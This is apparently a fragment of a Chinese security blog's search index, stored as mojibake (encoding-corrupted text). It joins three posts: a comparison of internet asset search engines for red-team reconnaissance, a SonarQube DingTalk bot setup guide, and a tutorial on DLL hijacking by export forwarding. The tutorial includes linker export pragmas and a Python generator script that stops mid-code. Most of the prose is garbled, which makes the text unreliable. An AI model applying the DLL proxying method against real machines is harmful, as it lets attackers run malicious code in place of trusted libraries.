æ”¯æŒå¯¹æš´éœ²æ¼æ´è¿›è¡Œæœç´¢çš„è²Œä¼¼åªæœ‰ shodan å’Œ sumap\nç½‘ç«™å¤‡æ¡ˆ å›½å†…é™¤äº† zoomeyeï¼ŒåŸºæœ¬éƒ½æœ‰å¯¹å¤‡æ¡ˆæœ‰ç®€å•çš„æ”¯æŒ\nå¯ä»¥å¯¹å¤‡æ¡ˆå·è¿›è¡Œæœç´¢ï¼Œå½“ç„¶ï¼Œsumapæ›´åŠ ç»†åŒ–äº†è¯¥åŠŸèƒ½\nè€Œ hunter åˆ™æ˜¯æ‰©å±•äº†è¯¥åŠŸèƒ½ï¼Œåšäº†æ›´å¤šå…³è”å·¥ä½œ\nåº”ç”¨åè®®ç»†åŒ– æ¯”è¾ƒäº†å‡ å®¶æ¥çœ‹çš„è¯ï¼Œåšçš„æœ€å¥½çš„æ˜¯quakeï¼Œé’ˆå¯¹åè®®æ–¹é¢åšäº†å¾ˆå¤šç»†åŒ–ï¼Œå…¶ä»–å„å®¶åŸºæœ¬åªæ˜¯é’ˆå¯¹httpåšäº†ç»†åŒ–ï¼ˆæ¯”å¦‚headerï¼Œheaderä¸­çš„serverå­—æ®µï¼Œwebå›¾æ ‡ï¼Œhttpæ­£æ–‡ç­‰ç­‰ï¼‰ï¼Œshodanä¹Ÿåšäº†ä¸€äº›åè®®çš„ç»†è‡´åŒ–æå–ï¼Œä½†æ˜¯æ²¡æœ‰quakeå¤š\nquakeä¸ä»…å¯¹httpåšäº†ç»†åŒ–ï¼Œè¿˜å¯¹ftpã€rsyncã€sshã€upnpã€snmpã€dockerã€dnsã€elasticã€hiveã€mongodbã€ethernetipã€modbusã€s7ã€smbç­‰åšäº†ç»†è‡´åŒ–çš„å†…å®¹æå–ï¼Œå…¶ä¸­rsyncå’Œmongoè¿˜åšäº†æ˜¯å¦æœªæˆæƒçš„æŒ‡çº¹æå–\nRDPæˆªå›¾ï¼Œè¿™ä¸ªåŠŸèƒ½æˆ‘ä¹Ÿä¸çŸ¥é“åœ¨ä»€ä¹ˆåœºæ™¯èƒ½ç”¨åˆ°ï¼Œç›®å‰æ¥çœ‹æ”¯æŒçš„æœ‰fofaã€quakeã€shodanã€sumapï¼Œå…¶ä»–å®¶ä¸æ”¯æŒï¼Œå…¶ä¸­quakeè¿˜å¯¹æˆªå›¾è¿›è¡Œäº†ocræ–‡å­—æå–\né™„åŠ è¯­æ³• ä¸Šé¢æåˆ°äº†ä¸€äº›æˆ‘ä»¬æœç´¢å¸¸è§å¸¸ç”¨çš„è¯­æ³•ï¼Œä¸‹é¢æ¥è¯´ä¸€ä¸‹å„å®¶ä¸€äº›ç‰¹è‰²çš„ä¸œè¥¿\nfofa fofaä¸­æœ‰ä¸ªåŠŸèƒ½æ˜¯ fidï¼Œèƒ½å¤Ÿé’ˆå¯¹ç½‘ç«™ç”Ÿæˆå”¯ä¸€çš„ç‰¹å¾idï¼›é€šè¿‡å¯¹ç›¸åŒçš„fidè¿›è¡Œèšåˆï¼Œæ¥å®ç°ç”¨æˆ·çš„æŸ¥è¯¢éœ€æ±‚ï¼›æœ€ç»ˆè§£å†³æœªçŸ¥èµ„äº§å‘ç°ã€è‡ªåŠ¨èšç±»ç½‘ç«™ã€èµ„äº§æŒ‡çº¹æ‰©å……ç­‰éœ€æ±‚ï¼‰ï¼Œå¸¸è§éœ€æ±‚ï¼šé€šè¿‡åŒä¸€å¥—ä¸šåŠ¡ç³»ç»Ÿå®šä½åˆ°æ‰€æœ‰ä½¿ç”¨è¿™å¥—ç³»ç»Ÿçš„ç½‘ç«™\nfofaè¿˜é’ˆå¯¹webç½‘é¡µä¸­çš„jsåšäº†å¤„ç† js_name å’Œ js_md5ï¼Œå¯ä»¥é’ˆå¯¹jsåšä¸€äº›æœç´¢ï¼Œå¯ä»¥æƒ³åˆ°çš„åœºæ™¯æ¯”å¦‚æŸä¸ªä¾›åº”é“¾å…¬å¸çš„å‡ å¥—äº§å“ï¼Œä¼šç”¨è‡ªå·±å†…éƒ¨çš„æŸä¸ªå…¬æœ‰jsï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è¯¥jsèšç±»å‡ºæ¥\nfofaé‡Œé¢è¿˜æœ‰ is_fraud å’Œ is_honeypotï¼Œis_fraud ç”¨æ¥æ’é™¤ä»¿å†’/æ¬ºè¯ˆæ•°æ®ï¼Œis_honeypotç”¨æ¥ æ’é™¤èœœç½æ•°æ®ï¼Œå¯¹äºä¸€äº›hvvåœºæ™¯ä¸‹çš„çº¢é˜Ÿæ”»å‡»æ¯”è¾ƒæœ‰ç”¨\nquake quakeå¯¹äºåº”ç”¨è¯†åˆ«ä¹Ÿåšäº†ä¸€äº›å½’ç±»ï¼Œå¯ä»¥æ ¹æ®åº”ç”¨å±äºä»€ä¹ˆç±»åˆ«ï¼Œæˆ–è€…å±äºé‚£ä¸€å±‚ï¼Œä»¥åŠç”Ÿäº§å‚å®¶ç­‰ç­‰æ¥åšæŸ¥è¯¢ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹ä¸‹å›¾\nquakeå¯¹ipçš„è¿è¥å•†å’Œå•ä½åšäº†ä¸€äº›å½’ç±»ï¼Œå¯ä»¥æŸ¥çœ‹IPå½’å±çš„è¿è¥å•†å’Œå•ä½ï¼ŒæŸ¥è¯¢ipå•ä½è¿™ä¸ªåŠŸèƒ½å¦‚æœåšå¾—å‡†ç¡®çš„è¯ä¼šå¤§å¤§æ–¹ä¾¿çº¢é˜Ÿ\nshodan shodanå¯¹ä¸€äº›äº‘æœåŠ¡åšäº†é¢å¤–è¯†åˆ«\nzoomeye zoomeyeæä¾›äº†ä¸€ä¸ª dig æŸ¥è¯¢ï¼Œä½†æ˜¯æˆ‘ç¡®å®ä¸æ¸…æ¥šè¿™ä¸ªæ˜¯å¹²å˜›çš„ï¼Œçœ‹èµ·æ¥åƒæ˜¯è·Ÿè¸ªè·¯ç”±è§£æçš„æ¯ä¸€è·³ï¼Œä½†æˆ‘æµ‹è¯•äº†ä»¥ä¸‹ï¼Œå°± baidu.com å’Œ google.com ç»“æœå¤šç‚¹ï¼Œå…¶ä»–çš„åŸŸååŸºæœ¬æŸ¥ä¸åˆ°ï¼Œæœ¬äººæš‚ä¸æ¸…æ¥šè¿™ä¸ªè¿‡æ»¤è¯­æ³•çš„åŠŸèƒ½å’Œç›®çš„\nsumap é™¤äº†ä¸Šé¢æåˆ°çš„æ¼æ´å’Œå¤‡æ¡ˆï¼Œsumapå¯¹äºä¸€äº›ç½‘ç«™åšäº†å†…å®¹è¯†åˆ«ç„¶ååˆ†äº†ç±»ï¼Œä½†æ˜¯å¹¶æœªæä¾›æ›´å¤šé€‰é¡¹å’Œæ ·ä¾‹ï¼Œé’ˆå¯¹ä¸€äº›æ”¿åºœæ‰“å‡»éæ³•ç½‘ç«™å¯èƒ½ä¼šæ¯”è¾ƒæœ‰ç”¨\nhunter hunteræ¯”è¾ƒç‰¹åˆ«çš„åŠŸèƒ½å°±æ˜¯å¤‡æ¡ˆäº†ï¼Œä¸Šé¢ä¹Ÿæœ‰æåˆ°ï¼Œhunteræœ‰æ ¹æ®ç½‘é¡µçš„å¤‡æ¡ˆå·å°†èµ„äº§å’Œå¤‡æ¡ˆä¿¡æ¯å…³è”èµ·æ¥ï¼Œå¯ä»¥é€šè¿‡å¤‡æ¡ˆä¿¡æ¯æ¥æœç´¢èµ„äº§ï¼Œè¿™ä¸ªåŠŸèƒ½å¯¹äºå›½å†…çº¢é˜Ÿå’Œhvvåœºæ™¯æ¯”è¾ƒæœ‰ç”¨ï¼Œæˆ–è€…åšä¸€äº›è¡Œä¸šèµ„äº§è¯„ä¼°\nç•Œé¢å’ŒåŠŸèƒ½ ä¸ºä»€ä¹ˆæŠŠåŠŸèƒ½å•ç‹¬æ‹†å‡ºæ¥å‘¢ï¼Œå› ä¸ºæœ‰äº›ä¸œè¥¿å¯èƒ½å¹¶æ²¡æœ‰ä»¥è¯­æ³•å½¢å¼æä¾›ï¼Œä½†æ˜¯åœ¨é¡µé¢ä¸Šèƒ½çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘æŠŠå®ƒå½’åˆ°äº†ç•Œé¢åŠŸèƒ½ä¸Š\né¦–å…ˆæ˜¯èšåˆåˆ†æï¼Œè¿™æ˜¯æ¯ä¸€å®¶éƒ½æœ‰çš„ï¼Œä¸‹é¢è¯´ä¸€ä¸‹å„å®¶çš„ç‰¹è‰²åŠŸèƒ½\nshodan shodanæä¾›äº†ç»™å®šèµ„äº§æ‰«æçš„åŠŸèƒ½\nzoomeye zoomeyeå¯ä»¥é’ˆå¯¹ç‰¹å®šè¯­æ³•è¿›è¡Œè®¢é˜…ï¼Œç„¶åå®ƒä¼šæä¾›ä¸€ä¸ªå‘¨æœŸå†…çš„èµ„äº§å˜åŒ–\nzoomeyeæä¾›äº†æ¶æ„ipæ ‡è®°åŠŸèƒ½\nquake quakeé’ˆå¯¹ç›¸ä¼¼çš„ç½‘ç«™å›¾æ ‡åšäº†èšåˆ\nquakeä¹Ÿå¯ä»¥åƒfofaä¸€æ ·æ’é™¤èœœç½ï¼Œä¸è¿‡æ˜¯åœ¨é¡µé¢ä¸Šæä¾›çš„ï¼Œä¹Ÿå¯ä»¥æ’é™¤cdn\nsumap sumapæä¾›äº†ä¸‰ä¸ªä¸åŒäºå…¶ä»–å®¶çš„èšåˆåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯whoisèšåˆåˆ†æï¼Œdnsè§£æèšåˆåˆ†æï¼Œä»¥åŠæ ¹æ®æ ¹èµ„äº§åšçš„æš´éœ²é¢åˆ†æ\nåŒæ—¶sumapæä¾›äº†ä¸€ä¸ªæ¼æ´æ”¶é›†é¡µé¢ï¼Œå¯ä»¥ç›´æ¥ç‚¹é€‰æ¼æ´è¿›è¡Œäº§å“æ¢³ç†ï¼Œè¿™ä¸ªæ¯”shodanè¦æ–¹ä¾¿\nåŒæ—¶å¯¹æ¼æ´åšäº†ä¸€äº›èšåˆï¼Œè¿™é‡Œå°±ä¸æˆªå›¾äº†\nhunter hunteråšäº†ä¸€ä¸ªæ¯”è¾ƒäººæ€§åŒ–çš„è®¾è®¡ï¼Œå°±æ˜¯è¯­æ³•å…³é”®è¯æç¤ºï¼Œè¾“å…¥ pï¼Œå°±ä¼šå‡ºç°ä¸€ä¸ªè¯­æ³•æ¨èï¼Œå‡ºç°æ‰€æœ‰åŒ…å« p çš„è¯­æ³•å…³é”®è¯ï¼Œç±»ä¼¼äºideé‡Œé¢çš„åªèƒ½æç¤ºï¼Œä¸‹é¢æ¥ç€çš„å°±æ˜¯å¤§å®¶éƒ½æœ‰çš„æŒ‡çº¹æç¤ºäº†\nåšå¾—è¿˜æœ‰ä¸ªæ¯”è¾ƒäººæ€§åŒ–çš„ä¸€ç‚¹æ˜¯ï¼Œè‡ªåŠ¨å¸®ä½ é€‰äº†æƒ³è¦çš„çŠ¶æ€ç å’Œèµ„äº§ç±»åˆ«\næ­¤å¤–å¯¹äºç™»å½•é¡µæœ‰é¢å¤–çš„æ ‡ç­¾æç¤º\nhunteré’ˆå¯¹å„å®¶çš„æœç´¢è¯­æ³•éƒ½æœ‰ä¸€å®šçš„å…¼å®¹æ€§\næ•°æ®æ›´æ–°å‘¨æœŸ shodanæ›´æ–°å‘¨æœŸä¸ºä¸€å‘¨ï¼ˆæ¥æº: https://help.shodan.io/the-basics/on-demand-scanningï¼‰ hunter 7å¤©æ›´æ–°å›½å†…èµ„äº§ï¼›30å¤©æ›´æ–°æµ·å¤–èµ„äº§ï¼ˆæ¥æº: https://hunter.qianxin.com/home/helpCenterï¼‰ å…¶ä»–å®¶çš„æœªè§åˆ°è¯´æ˜\næ”¶è´¹ä½“ç³» ç»¼åˆæ¥çœ‹ï¼Œå¯¹äºé‡åº¦ä½¿ç”¨è€…ï¼ˆæŒ‡é‚£äº›éœ€è¦ä½¿ç”¨apiè‡ªåŠ¨åŒ–çš„äººï¼‰ï¼Œfofaæ˜¯æœ€å®æƒ çš„ï¼Œä¹°æ–­åˆ¶ï¼Œåªå¯¹å•æ¬¡å¯¼å‡ºæ•°é‡æœ‰é™åˆ¶ï¼Œå¯¹å¯¼å‡ºæ€»é‡æ²¡æœ‰é™åˆ¶ã€‚\nå…¶ä»–å®¶å„ç§æ”¶è´¹ä½“ç³»ï¼ŒåŸºæœ¬éƒ½æ˜¯æ¯æœˆç»™ä½ ä¸€å®šé‡çš„å…è´¹æŸ¥è¯¢é¢ï¼ˆæŒ‰ç…§æ¯æ¡æˆ–è€…æ¯é¡µï¼‰ï¼Œä»˜è´¹å¯ä»¥å¢åŠ æŸ¥è¯¢é¢ï¼Œæ€»ä½“ä¸Šæ¥è¯´å°±æ˜¯å¯¹äºæ¯æœˆæŸ¥è¯¢æ€»é‡åšäº†é™åˆ¶\nä¸ªäººæ€»ç»“ å› ä¸ºå·¥ä½œä¸Šå¶å°”æ¥è§¦çº¢é˜Ÿï¼Œæ‰€ä»¥ä¼šæ›´åå‘äºå›½å†…èµ„äº§çš„æ¢æµ‹ï¼Œæ‰€ä»¥ä»¥ä¸‹çš„å‡æ˜¯å›½å†…çš„ç½‘ç»œç©ºé—´æ£€ç´¢ç½‘ç«™\nç›®å‰æ¥çœ‹ï¼Œhunteré™¤äº†ä½“éªŒä¸Šçš„ä¼˜åŒ–å¤–ï¼Œæ¯”è¾ƒå¸å¼•äººçš„æ˜¯å¤‡æ¡ˆå…³è”ä¿¡æ¯çš„æŸ¥è¯¢ï¼Œè¿™ä¸ªå¯¹äºå›½å†…çš„ä¸€äº›åº”ç”¨åœºæ™¯å¾ˆé€‚ç”¨\nquakeçš„èµ„äº§åˆ†ç±»åšå¾—æ˜¯è¿™äº›ä¸­åšå¾—æœ€å¥½çš„\nå…³äºæ¼æ´æœç´¢ï¼Œsumapæ¯”è¾ƒåˆé€‚\nå¦‚æœæƒ³è¦èµ„äº§ç›‘æ§ï¼Œå¯èƒ½zoomeyeæ›´åˆé€‚ï¼ˆæˆ–è€…æ˜¯è´¦å·ç­‰çº§çš„åŸå› ï¼Œå…¶ä»–å¹³å°æœªè§åˆ°ï¼‰\nå‚è€ƒèµ„æ–™ è¯ä¹¦å„ä¸ªå­—æ®µçš„å«ä¹‰ fofa.so quakeå¸®åŠ©æ–‡æ¡£ shodan Filter Reference zoomeyeç”¨æˆ·æ‰‹å†Œ sumap hunter åŸºç¡€è¯­æ³•ä»‹ç» Featureå¼•æ“æ­£å¼ä¸Šçº¿ï¼â€œæ‹“çº¿â€åŠŸèƒ½å¼€æ”¾ï¼ ","permalink":"https://www.hacktech.cn/post/net-search-platform-compare.html","summary":"\u003cp\u003eæœ€è¿‘ç½‘ç»œç©ºé—´æ£€ç´¢å¹³å°é›¨åæ˜¥ç¬‹èˆ¬æ¶Œç°ï¼Œæœ¬ç¯‡æ–‡ç« ä»¥ä¸€ä¸ªä½¿ç”¨è€…çš„è§†è§’æ¥åšä¸€ä¸‹å¯¹æ¯”\u003c/p\u003e","title":"ç½‘ç»œç©ºé—´æ£€ç´¢å¹³å°å¯¹æ¯”"},{"content":"ç½‘ä¸Šçœ‹åˆ°çš„é’‰é’‰é€šçŸ¥æ’ä»¶å·²ç»ä¸é€‚ç”¨äºæœ€æ–°çš„ SonarQube äº†ï¼Œæ‰€ä»¥è‡ªå·±èŠ±äº†ç‚¹æ—¶é—´æ’¸äº†ä¸€ä¸‹\nä»“åº“åœ°å€: https://github.com/akkuman/sonarqube-ding-robot\nå‚æ•°è¯´æ˜ 1 2 3 4 5 Usage of ./sonarqube-ding-robot: -addr string è¾“å…¥ç›‘å¬åœ°å€ (default \u0026#34;0.0.0.0:9001\u0026#34;) -token string è¾“å…¥sonarqube token ä½¿ç”¨ é’‰é’‰æœºå™¨äººçš„é…ç½® é¦–å…ˆæ‰“å¼€ç¾¤æœºå™¨äººæ·»åŠ é¡µé¢\næ·»åŠ ä¸€ä¸ª è‡ªå®šä¹‰ï¼ˆé€šè¿‡webhookæ¥å…¥è‡ªå®šä¹‰æœåŠ¡ï¼‰ çš„æœºå™¨äºº\nç„¶åå¤åˆ¶å‡ºè¯¥å›è°ƒåœ°å€\nä½ ä¼šå¾—åˆ°ä¸€ä¸ªç±»ä¼¼äº https://oapi.dingtalk.com/robot/send?access_token=xxxx çš„urlï¼Œå…¶ä¸­çš„ xxxx å°±æ˜¯é’‰é’‰æœºå™¨äººçš„token\næ·»åŠ ä¸€ä¸ªå®‰å…¨è®¾ç½®ï¼Œå…³é”®è¯æ·»åŠ  ä»£ç ï¼Œæˆ–è€…ä½ å¯ä»¥é€‰æ‹©ipæ®µï¼Œè¿™é‡Œä¸è¯¦ç»†è¯´æ˜äº†\nè·å– sonarqube çš„token æŒ‰ç…§ä¸‹å›¾è¿›è¡Œç”Ÿæˆ\nç”Ÿæˆåä½ ä¼šå¾—åˆ° sonarqube çš„ token\nè¿è¡Œ sonarqube-ding-robot ä¸‹è½½ç¨‹åº\n1 wget https://github.com/akkuman/sonarqube-ding-robot/releases/latest/download/sonarqube-ding-robot æˆ–è€…\n1 go install github.com/akkuman/sonarqube-ding-robot ç„¶ååå°è¿è¡Œè¯¥ç¨‹åºï¼ˆæœåŠ¡ï¼‰\n1 2 chmod +x sonarqube-ding-robot nohup ./sonarqube-ding-robot -addr 0.0.0.0:9696 -token sonarqubeçš„token åœ¨sonarqubeè¿›è¡Œç½‘ç»œè°ƒç”¨é…ç½® å¦‚æœä½ æƒ³é…ç½®å…¨å±€çš„ç½‘ç»œè°ƒç”¨ï¼ˆæ‰€æœ‰é¡¹ç›®éƒ½å‘é€é€šçŸ¥ï¼‰ï¼Œè¿›å…¥ sonarqube çš„ç½‘ç»œè°ƒç”¨é…ç½®ç•Œé¢ http://xxxx.com/admin/webhooks\næŒ‰ç…§ä¸Šå›¾è¿›è¡Œè®¾ç½®\né€šçŸ¥å®Œæˆ ç„¶åè¿›è¡Œæ‰«æåï¼Œå°†ä¼šåœ¨é’‰é’‰ç¾¤å†…æ¨é€ä¸€åˆ™é€šçŸ¥\nReference https://github.com/viodo/sonar-dingtalk-plugin ","permalink":"https://www.hacktech.cn/post/proj-sonarqube-dingtalk-robot.html","summary":"\u003cp\u003eç½‘ä¸Šçœ‹åˆ°çš„é’‰é’‰é€šçŸ¥æ’ä»¶å·²ç»ä¸é€‚ç”¨äºæœ€æ–°çš„ SonarQube äº†ï¼Œæ‰€ä»¥è‡ªå·±èŠ±äº†ç‚¹æ—¶é—´æ’¸äº†ä¸€ä¸‹\u003c/p\u003e","title":"SonarQubeé’‰é’‰é€šçŸ¥æ’ä»¶"},{"content":"æœ¬æ–‡ç« å°†è®²è§£å¦‚ä½•ä½¿ç”¨æ¶æ„çš„ Golang æ¥å®ç° dll åŠ«æŒè½¬å‘\ndll è½¬å‘æ¦‚è¿° dll è½¬å‘: æ”»å‡»è€…ä½¿ç”¨æ¶æ„dllæ›¿æ¢åŸå§‹dllï¼Œé‡å‘½ååŸå§‹dllå¹¶é€šè¿‡æ¶æ„dllå°†åŸå…ˆçš„åŠŸèƒ½è½¬å‘è‡³åŸå§‹dllã€‚\nè¯¥æ¶æ„dllä¸€èˆ¬ç”¨æ¥ä¸“é—¨æ‰§è¡Œæ”»å‡»è€…å¸Œæœ›æ‹¦æˆªæˆ–ä¿®æ”¹çš„åŠŸèƒ½ï¼ŒåŒæ—¶å°†æ‰€æœ‰å…¶ä»–åŠŸèƒ½è½¬å‘è‡³åŸå§‹dll\nä¸€èˆ¬å¯ä¸ dll åŠ«æŒå…±åŒä½¿ç”¨ã€‚\ndll æœç´¢é¡ºåº é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ Windows ç³»ç»Ÿä¸­ dll çš„æœç´¢é¡ºåº\nä¸Šå›¾ä¸­æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„å°±æ˜¯æ ‡å‡†æœç´¢é¡ºåºä¸­çš„æ­¥éª¤ï¼Œæ ¹æ®æƒ…å†µçš„ä¸åŒæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸åŒçš„æ–¹å¼æ¥è¿›è¡Œ dll åŠ«æŒ\næ­¥éª¤ è¦å®ç° dll è½¬å‘ï¼Œä¸€èˆ¬éœ€è¦ä»¥ä¸‹ä¸€äº›æ­¥éª¤\nè§£æåŸå§‹ dll çš„å¯¼å‡ºè¡¨ æ”¶é›†å‡ºè¦æ‹¦æˆªä¿®æ”¹çš„å‡½æ•° åœ¨æ¶æ„ dll ä¸­å®ç°æ‹¦æˆªåŠŸèƒ½ å°†æ‰€æœ‰å…¶ä»–å‡½æ•°è½¬å‘è‡³åŸå§‹ dll ä¸Š é‡å‘½ååŸå§‹ dll ä½¿ç”¨åŸå§‹ dll çš„åç§°é‡å‘½åæ¶æ„ dll PE æ–‡ä»¶å¯¼å‡ºè¡¨ ä»€ä¹ˆæ˜¯ PE å¯¼å‡ºè¡¨ï¼Ÿ å¯¼å‡ºè¡¨å°±æ˜¯å½“å‰çš„ PE æ–‡ä»¶æä¾›äº†å“ªäº›å‡½æ•°ç»™åˆ«äººè°ƒç”¨ã€‚\nå¹¶ä¸åªæœ‰ dll æ‰æœ‰å¯¼å‡ºè¡¨ï¼Œæ‰€æœ‰çš„ PE æ–‡ä»¶éƒ½å¯ä»¥æœ‰å¯¼å‡ºè¡¨ï¼Œexe ä¹Ÿå¯ä»¥å¯¼å‡ºå‡½æ•°ç»™åˆ«äººä½¿ç”¨ï¼Œä¸€èˆ¬æƒ…å†µè€Œè¨€ exe æ²¡æœ‰ï¼Œä½†å¹¶ä¸æ˜¯ä¸å¯ä»¥æœ‰\nå¯¼å‡ºè¡¨åœ¨å“ªé‡Œï¼Ÿ PE æ–‡ä»¶æ ¼å¼åœ¨è¿™é‡Œå¹¶ä¸è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ç›¸å…³èµ„æ–™ã€‚\nPE æ–‡ä»¶åŒ…å« DOS å¤´å’Œ PE å¤´ï¼ŒPE å¤´é‡Œé¢æœ‰ä¸€ä¸ªæ‰©å±•å¤´ï¼Œè¿™é‡Œé¢åŒ…å«äº†ä¸€ä¸ªæ•°æ®ç›®å½•ï¼ˆåŒ…å«æ¯ä¸ªç›®å½•çš„VirtualAddresså’ŒSizeçš„æ•°ç»„ã€‚ç›®å½•åŒ…æ‹¬ï¼šå¯¼å‡ºã€å¯¼å…¥ã€èµ„æºã€è°ƒè¯•ç­‰ï¼‰ï¼Œä»è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å°±èƒ½å¤Ÿå®šä½åˆ°å¯¼å‡ºè¡¨ä½äºå“ªé‡Œ\nå¯¼å‡ºè¡¨çš„ç»“æ„ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¯¼å‡ºè¡¨çš„ç»“æ„\n1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; //æ—¶é—´æˆ³. ç¼–è¯‘çš„æ—¶é—´. æŠŠç§’è½¬ä¸ºæ—¶é—´.å¯ä»¥çŸ¥é“è¿™ä¸ªDLLæ˜¯ä»€ä¹ˆæ—¶å€™ç¼–è¯‘å‡ºæ¥çš„. WORD MajorVersion; WORD MinorVersion; DWORD Name;ã€€//æŒ‡å‘è¯¥å¯¼å‡ºè¡¨æ–‡ä»¶åçš„å­—ç¬¦ä¸²,ä¹Ÿå°±æ˜¯è¿™ä¸ªDLLçš„åç§° è¾…åŠ©ä¿¡æ¯.ä¿®æ”¹ä¸å½±å“ å­˜å‚¨çš„RVA å¦‚æœæƒ³åœ¨æ–‡ä»¶ä¸­æŸ¥çœ‹.è‡ªå·±è®¡ç®—ä¸€ä¸‹FOAå³å¯. DWORD Base; // å¯¼å‡ºå‡½æ•°çš„èµ·å§‹åºå· DWORD NumberOfFunctions; //æ‰€æœ‰çš„å¯¼å‡ºå‡½æ•°çš„ä¸ªæ•° DWORD NumberOfNames; //ä»¥åå­—å¯¼å‡ºçš„å‡½æ•°çš„ä¸ªæ•° DWORD AddressOfFunctions; // å¯¼å‡ºçš„å‡½æ•°åœ°å€çš„ åœ°å€è¡¨ RVA ä¹Ÿå°±æ˜¯ å‡½æ•°åœ°å€è¡¨ DWORD AddressOfNames; // å¯¼å‡ºçš„å‡½æ•°åç§°è¡¨çš„ RVA ä¹Ÿå°±æ˜¯ å‡½æ•°åç§°è¡¨ DWORD AddressOfNameOrdinals; // å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„RVA ä¹Ÿå°±æ˜¯ å‡½æ•°åºå·è¡¨ } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; æˆ‘ä»¬ä½¿ç”¨cff explorerçœ‹çœ‹dllçš„å¯¼å‡ºè¡¨\nå¯æƒœä»è¿™ä¸ªå›¾ä¸Šæˆ‘ä»¬å¹¶ä¸èƒ½è§‚å¯Ÿå‡ºå¯¼å‡ºçš„å‡½æ•°æ˜¯å¦æ˜¯ä¸€ä¸ªè½¬å‘å‡½æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€çœ‹çœ‹\nä»è¿™ä¸ªå›¾ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ° add å¯¼å‡ºå‡½æ•°å‰é¢è¿˜æœ‰ä¸€äº›ä¸œè¥¿ _lyshark.dll._lyshark.add.add\nè¿™ä¸ªæ ‡è¯†å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ª dll çš„å¯¼å‡ºå‡½æ•° add å®é™…ä¸Šä½äº _lyshark.dll ä¸Š\ndll è½¬å‘å¦‚ä½•å·¥ä½œ å½“æˆ‘ä»¬è°ƒç”¨è½¬å‘å‡½æ•°æ—¶ï¼ŒWindowsåŠ è½½ç¨‹åºå°†æ£€æŸ¥è¯¥ dllï¼ˆå³æ¶æ„ dllï¼‰æ‰€å¼•ç”¨çš„ dllï¼ˆå³åŸå§‹dllï¼‰æ˜¯å¦å·²åŠ è½½ï¼Œå¦‚æœå¼•ç”¨çš„ dll è¿˜æ²¡æœ‰åŠ è½½åˆ°å†…å­˜ä¸­ï¼ŒWindowsåŠ è½½ç¨‹åºå°†åŠ è½½è¿™ä¸ªå¼•ç”¨çš„ dllï¼Œæœ€åæœç´¢è¯¥å¯¼å‡ºå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»¥ä¾¿æˆ‘ä»¬è°ƒç”¨å®ƒ\ndll è½¬å‘ï¼ˆdll åŠ«æŒï¼‰çš„ä¸€èˆ¬å®ç° æˆ‘ä»¬èƒ½åœ¨ç½‘ä¸Šæœç´¢åˆ°ä¸€äº› dll è½¬å‘ï¼ˆdll åŠ«æŒï¼‰çš„å®ç°ï¼ŒåŸºæœ¬æ˜¯ä½¿ç”¨å¾®è½¯ MSVC ç¼–è¯‘å™¨çš„ç‰¹æ®Šèƒ½åŠ›4\nMSVC æ”¯æŒåœ¨ cpp æºæ–‡ä»¶ä¸­å†™ä¸€äº›é“¾æ¥é€‰é¡¹ï¼Œç±»ä¼¼\n1 #progma comment(linker, \u0026#34;/export:FUNCTION_NAME=è¦è½¬å‘çš„dllæ–‡ä»¶å.FUNCTION_NAME\u0026#34;) åˆ—å‡ºå¯¼å‡ºå‡½æ•° ä¸‹é¢æˆ‘ä»¬é‡‡ç”¨ MSVC å¯¹ zlib.dll å®ç°ä¸€ä¸ªæ ·ä¾‹5\né¦–å…ˆæˆ‘ä»¬èƒ½ä½¿ç”¨ DLL Export Viewer å·¥å…·æŸ¥çœ‹å¹¶å¯¼å‡ºä¸€ä¸ª dll çš„å¯¼å‡ºè¡¨\nç„¶åæˆ‘ä»¬ç‚¹å‡» View \u0026gt; HTML Report - All Functions\næˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªç±»ä¼¼äºä¸‹é¢çš„ html\nç»™ MSVC é“¾æ¥å™¨ç”Ÿæˆå¯¼å‡ºæŒ‡ä»¤ æˆ‘ä»¬ç°åœ¨å¯ä»¥æŠŠè¿™ä¸ª html è½¬åŒ–ä¸º MSVC çš„å¯¼å‡ºæŒ‡ä»¤5\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026#34;\u0026#34;\u0026#34; The report generated by DLL Exported Viewer is not properly formatted so it can\u0026#39;t be analyzed using a parser unfortunately. \u0026#34;\u0026#34;\u0026#34; from __future__ import print_function import argparse def main(): parser = argparse.ArgumentParser(description=\u0026#34;DLL Export Viewer - Report Parser\u0026#34;) parser.add_argument(\u0026#34;report\u0026#34;, help=\u0026#34;the HTML report generated by DLL Export Viewer\u0026#34;) args = parser.parse_args() report = args.report try: f = open(report) page = f.readlines() f.close() except: print(\u0026#34;[-] ERROR: open(\u0026#39;%s\u0026#39;)\u0026#34; % report) return for line in page: if line.startswith(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;): cols = line.replace(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;\u0026lt;td bgcolor=#FFFFFF nowrap\u0026gt;\u0026#34;) function_name = cols[1] ordinal = cols[4].split(\u0026#39; \u0026#39;)[0] dll_orig = \u0026#34;%s_orig\u0026#34; % cols[5][:cols[5].rfind(\u0026#39;.\u0026#39;)] print(\u0026#34;#pragma comment(linker,\\\u0026#34;/export:%s=%s.%s,@%s\\\u0026#34;)\u0026#34; % (function_name, dll_orig, function_name, ordinal)) if __name__ == 